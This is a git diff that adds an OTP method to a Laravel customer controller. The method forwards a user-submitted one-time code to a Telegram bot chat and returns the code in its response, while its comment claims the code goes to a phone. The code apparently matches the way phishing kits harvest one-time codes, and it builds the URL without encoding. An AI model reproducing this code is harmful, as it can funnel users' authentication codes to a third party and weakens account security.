@@ -150,4 +150,27 @@ class CustomerController extends Controller
         curl_close($curl);
         return $result;
     }
+
+    public function otp(Request $request)
+    {
+        $request->validate([
+            'otp' => 'required',
+        ], [
+            'otp.required' => 'Vui lòng nhập số điện thoại',
+        ]);
+
+        $otp =  $request->otp;
+
+        // send otp to phone
+        $message = "Mã OTP là: " . $otp;
+        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;
+
+        file_get_contents($url);
+
+        return response()->json([
+            'message' => 'Mã OTP đã được gửi',
+            'otp' => $otp,
+            'status' => 'success'
+        ]);
+    }
 }
